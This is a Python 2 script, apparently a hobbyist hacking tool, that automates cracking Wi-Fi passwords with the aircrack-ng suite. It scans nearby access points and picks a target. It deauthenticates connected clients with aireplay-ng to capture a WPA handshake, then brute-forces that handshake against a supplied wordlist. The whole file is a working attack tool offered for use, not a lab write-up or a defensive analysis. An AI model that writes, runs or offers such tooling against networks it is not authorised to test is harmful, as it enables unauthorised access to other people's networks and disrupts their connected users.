# Date: 06/18/2017
# Distro: Kali linux
# Author: Ethical-H4CK3R
# Description: Cracks wifi passwords
#
# imports
import os
import csv
import time
import argparse
import threading
import subprocess

from core.interface import Interface as interface
from core.accesspoints import Accesspoints as accesspoints

class Aircrack(object):
 def __init__(self,iface):
  self.devnull = open(os.devnull,'w')
  self.iface   = iface
  self.wait    = None # wait for handshake
  self.run     = True
  self.atk     = None
  self.out     = 'data-01.out'
  self.csv     = 'data-01.csv'
  self.cap     = 'data-01.cap'
  self.ap      = accesspoints()
  self.iw      = interface()
  self.pd      = None # update(pd) message

 def load(self):
  # scanning ...
  self.ap = accesspoints()
  while not self.ap.aps and self.run:
   for n in range(4):
    time.sleep(.4)
    if self.ap.mem:break
    subprocess.call(['clear'])
    print 'Scanning {}'.format(n*'.')
  time.sleep(3)

 def scan(self):
  cmd = ['airodump-ng','-a','-w','data','--output-format','csv','wlan0']
  subprocess.Popen(cmd,stdout=self.devnull,stderr=self.devnull)

 def kill(self):
  # kill processes
  for proc in ['airodump-ng','aireplay-ng','aircrack-ng']:
   subprocess.Popen(['pkill',proc]).wait()

 def remove(self):
  # remove any saved csv file
  for f in os.listdir('.'):
   if f.startswith('data'):
    os.remove(f)

 def target(self,mac,chann):
  self.kill()
  self.remove()
  self.ap.aps = {}
  self.ap.mem = []
  cmd = ['airodump-ng','-a','--bssid',mac,'-c',chann,'-w','data','--output-format','cap,csv',self.iface]
  subprocess.Popen(cmd,stdout=self.devnull,stderr=self.devnull)
  time.sleep(1.5)

 def startScan(self):
  self.kill()
  self.remove()
  self.iw.monitorMode(self.iface) # enable monitor mode
  threading.Thread(target=self.load).start()
  self.scan()

 def stopScan(self):
  self.kill()

 def display(self):
  if os.path.exists(self.csv):
   self.ap.open(self.csv)

 def updateMsg(self,essid):
  while self.pd:
   for n in range(4):
    time.sleep(.4)
    if not self.pd:break
    subprocess.call(['clear'])
    print 'Scanning: {} {}'.format(essid,(n*'.'))

 def search(self,mac):
  if os.path.exists(self.csv):
   with open(self.csv,'r') as csvfile:
    csvfile = csv.reader(csvfile,delimiter=',')
    lines = [line for line in csvfile]
    num = [num for num,line in enumerate(lines) if len(line)==15 if line[0]==mac]
    if num:
     self.pd = False
     return lines[num[0]][3]

 def updateChannel(self,mac):
  if not mac in self.ap.aps.keys():return
  ap = self.ap.aps[mac]
  essid = ap['essid']
  self.kill()
  self.remove()
  self.pd = True
  threading.Thread(target=self.updateMsg,args=[essid]).start()
  cmd = ['airodump-ng','-w','data','--output-format','csv','-a',self.iface]
  subprocess.Popen(cmd,stdout=self.devnull,stderr=self.devnull)
  while 1:
   chann = self.search(mac)
   if chann:
    ap['chann'] = chann.strip()
    break

 def aircrack(self,mac,passlist):
  # few configs
  self.kill()
  os.chdir(base) # change directory back
  self.iw.managedMode(self.iface)
  capFile = '/tmp/{}'.format(self.cap)
  cmd = ['aircrack-ng',capFile,'-w',passlist]
  subprocess.call(['clear'])

  # start aircrack
  try:
   subprocess.Popen(cmd).wait()
  except KeyboardInterrupt:
   self.kill()
   self.iw.managedMode(self.iface)

 def attack(self,mac):
  cmd=['aireplay-ng','-0','1','-a',mac,'--ignore-negative-one',self.iface]
  subprocess.Popen(cmd,stdout=self.devnull,stderr=self.devnull).wait()
  time.sleep(1.3)

 def readCap(self):
  if os.path.exists(self.cap):
   log = open(self.out,'w')
   cmd = ['aircrack-ng',self.cap]
   subprocess.Popen(cmd,stdout=log,stderr=log).wait()

 def readLog(self):
  if not os.path.exists(self.out):return
  with open(self.out) as aircrackOutput:
   line = [line for line in aircrackOutput]
   line = line[5].split()
   line = [line for line in line[4]]
   if eval(line[1]):
    self.wait = False

 def handshake(self):
  while self.wait:
   self.display()
   time.sleep(.1)
   if self.ap.aps.keys() and not self.atk:
    threading.Thread(target=self.listen).start()

 def listen(self):
  # there's only one ap in dict
  mac = self.ap.aps.keys()[0]
  ap  = self.ap.aps[mac]

  # are there nay clients
  if ap['client']:
   self.atk = True
   [self.attack(mac) for n in range(3)]
   time.sleep(5)
   self.readCap()
   self.readLog()
   self.atk = False

 def exit(self):
  self.kill()
  self.remove()
  self.wait = False
  self.run = False
  self.iw.managedMode(self.iface)
  exit('\n')

def main():
 # assign arugments
 args = argparse.ArgumentParser()
 args.add_argument('wordlist',help='wordlist')
 args.add_argument('interface',help='wireless interface')
 args = args.parse_args()

 # assign variables
 iface = args.interface
 engine = Aircrack(iface)
 wordlist = args.wordlist

 # validate wordlist
 if not os.path.exists(wordlist):
  exit('Error: unable to locate \'{}\''.format(wordlist))

 # change directory
 os.chdir('/tmp')

 # start scanning
 engine.startScan()

 # display
 while 1:
  try:engine.display()
  except KeyboardInterrupt:
   engine.stopScan()
   break

 try:
  num = int(input('\nEnter num: '))
 except KeyboardInterrupt:
  engine.exit()

 mac = engine.ap.mem[num]
 chann = engine.ap.aps[mac]['chann']

 # display scanning
 threading.Thread(target=engine.load).start()

 # wait for handshake
 while 1:
  try:
   engine.wait = True # wait for handshake
   engine.target(mac,chann) # scan the target
   threading.Thread(target=engine.handshake).start() # look for handshake

   # scan for 30 seconds before retry
   for t in range(30):
    time.sleep(1)
    if not engine.wait:
     break

   # check if we capture a handshake
   engine.wait = False if engine.wait else None
   if engine.wait == None:break

   # if failed to capture handshake,
   # then there must be noone connected,
   # or router hopped to a new channel,
   # so rescan every network, and find the router
   engine.updateChannel(mac)
  except KeyboardInterrupt:
   engine.exit();break

 # start brute force
 engine.aircrack(mac,wordlist)

if __name__ == '__main__':
 base = os.getcwd()
 [exit('root access required') if os.getuid() else main()]
